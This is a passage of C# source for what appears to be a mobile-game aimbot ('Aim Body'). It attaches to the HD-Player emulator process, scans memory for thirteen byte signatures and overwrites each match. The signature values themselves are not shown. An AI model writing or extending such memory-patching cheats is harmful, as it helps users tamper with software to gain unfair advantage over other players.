                            bruuuh.WriteMemory(wl3.ElementAt(i).ToString("X"), "bytes", Replacemagic3);
                        }
                        k = true;
                    }

                    IEnumerable<long> wl4 = await bruuuh.AoBScan(Searchmagic4, writable: true);
                    string u4 = "0x" + wl3.FirstOrDefault().ToString("X");
                    if (wl4.Count() != 0)
                    {
                        for (int i = 0; i < wl4.Count(); i++)
                        {
                            i2++;
                            bruuuh.WriteMemory(wl4.ElementAt(i).ToString("X"), "bytes", Replacemagic4);
                        }
                        k = true;
                    }


                    IEnumerable<long> wl5 = await bruuuh.AoBScan(Searchmagic5, writable: true);
                    string u5 = "0x" + wl5.FirstOrDefault().ToString("X");
                    if (wl5.Count() != 0)
                    {
                        for (int i = 0; i < wl5.Count(); i++)
                        {
                            i2++;
                            bruuuh.WriteMemory(wl5.ElementAt(i).ToString("X"), "bytes", Replacemagic5);
                        }
                        k = true;
                    }

                    IEnumerable<long> wl6 = await bruuuh.AoBScan(Searchmagic6, writable: true);
                    string u6 = "0x" + wl6.FirstOrDefault().ToString("X");
                    if (wl6.Count() != 0)
                    {
                        for (int i = 0; i < wl6.Count(); i++)
                        {
                            i2++;
                            bruuuh.WriteMemory(wl6.ElementAt(i).ToString("X"), "bytes", Replacemagic6);
                        }
                        k = true;
                    }

                    IEnumerable<long> wl7 = await bruuuh.AoBScan(Searchmagic7, writable: true);
                    string u7 = "0x" + wl7.FirstOrDefault().ToString("X");
                    if (wl7.Count() != 0)
                    {
                        for (int i = 0; i < wl7.Count(); i++)
                        {
                            i2++;
                            bruuuh.WriteMemory(wl7.ElementAt(i).ToString("X"), "bytes", Replacemagic7);
                        }
                        k = true;
                    }

                    IEnumerable<long> wl8 = await bruuuh.AoBScan(Searchmagic8, writable: true);
                    string u8 = "0x" + wl8.FirstOrDefault().ToString("X");
                    if (wl8.Count() != 0)
                    {
                        for (int i = 0; i < wl8.Count(); i++)
                        {
                            i2++;
                            bruuuh.WriteMemory(wl8.ElementAt(i).ToString("X"), "bytes", Replacemagic8);
                        }
                        k = true;
                    }

                    IEnumerable<long> wl9 = await bruuuh.AoBScan(Searchmagic9, writable: true);
                    string u9 = "0x" + wl9.FirstOrDefault().ToString("X");
                    if (wl9.Count() != 0)
                    {
                        for (int i = 0; i < wl9.Count(); i++)
                        {
                            i2++;
                            bruuuh.WriteMemory(wl9.ElementAt(i).ToString("X"), "bytes", Replacemagic9);
                        }
                        k = true;
                    }

                    IEnumerable<long> wl10 = await bruuuh.AoBScan(Searchmagic10, writable: true);
                    string u10 = "0x" + wl10.FirstOrDefault().ToString("X");
                    if (wl10.Count() != 0)
                    {
                        for (int i = 0; i < wl10.Count(); i++)
                        {
                            i2++;
                            bruuuh.WriteMemory(wl10.ElementAt(i).ToString("X"), "bytes", Replacemagic10);
                        }
                        k = true;
                    }

                    IEnumerable<long> wl11 = await bruuuh.AoBScan(Searchmagic11, writable: true);
                    string u11 = "0x" + wl11.FirstOrDefault().ToString("X");
                    if (wl11.Count() != 0)
                    {
                        for (int i = 0; i < wl11.Count(); i++)
                        {
                            i2++;
                            bruuuh.WriteMemory(wl11.ElementAt(i).ToString("X"), "bytes", Replacemagic11);
                        }
                        k = true;
                    }

                    IEnumerable<long> wl12 = await bruuuh.AoBScan(Searchmagic12, writable: true);
                    string u12 = "0x" + wl12.FirstOrDefault().ToString("X");
                    if (wl12.Count() != 0)
                    {
                        for (int i = 0; i < wl12.Count(); i++)
                        {
                            i2++;
                            bruuuh.WriteMemory(wl12.ElementAt(i).ToString("X"), "bytes", Replacemagic12);
                        }
                        k = true;
                    }

                    IEnumerable<long> wl13 = await bruuuh.AoBScan(Searchmagic13, writable: true);
                    string u13 = "0x" + wl13.FirstOrDefault().ToString("X");
                    if (wl13.Count() != 0)
                    {
                        for (int i = 0; i < wl13.Count(); i++)
                        {
                            i2++;
                            bruuuh.WriteMemory(wl13.ElementAt(i).ToString("X"), "bytes", Replacemagic13);
                        }
                        k = true;
                    }

                    if (k == true)
                    {
                        STA.Text = $"Aim Body  {on}";
                        SoundManager.PlaySound(Properties.Resources.welcome);
                    }
                    else
                    {
                        STA.Text = $"{nope} Aim Body ";
                    }
                }
                //        if (Process.GetProcessesByName("HD-Player").Length == 0)
                //        {
                //            STA.Text = $"{open}";
                //        }
                //        else
                //        {
                //            bruuuh.OpenProcess("HD-Player");
                //            STA.Text = $"{wait} Aim Body";
                //            int i2 = 22000000;

                //            string[] searchMagic = new string[]
                //            {
                //"search1", "search2", "search3", "search4", "search5", "search6",
                //"search7", "search8", "search9", "search10", "search11", "search12", "search13"
                //            };

                //            string[] replaceMagic = new string[]
                //            {
                //"replace1", "replace2", "replace3", "replace4", "replace5", "replace6",
                //"replace7", "replace8", "replace9", "replace10", "replace11", "replace12", "replace13"
                //            };

                //            bool k = false;
                //            for (int j = 0; j < searchMagic.Length; j++)
                //            {
                //                IEnumerable<long> wl = await bruuuh.AoBScan(searchMagic[j], writable: true);
                //                string u = "0x" + wl.FirstOrDefault().ToString("X");

                //                if (wl.Count() != 0)
                //                {
                //                    for (int i = 0; i < wl.Count(); i++)
                //                    {
                //                        i2++;
                //                        bruuuh.WriteMemory(wl.ElementAt(i).ToString("X"), "bytes", replaceMagic[j]);
                //                    }
                //                    k = true;
                //                }
                //            }

                //            if (k == true)
                //            {
                //                STA.Text = $"Aim Body  {on}";
                //                SoundManager.PlaySound(Properties.Resources.welcome);
                //            }
                //            else
                //            {
                //                STA.Text = $"{nope} Aim Body ";
                //            }
                //        }

            }
            else
            {

            }
        }
    }
}
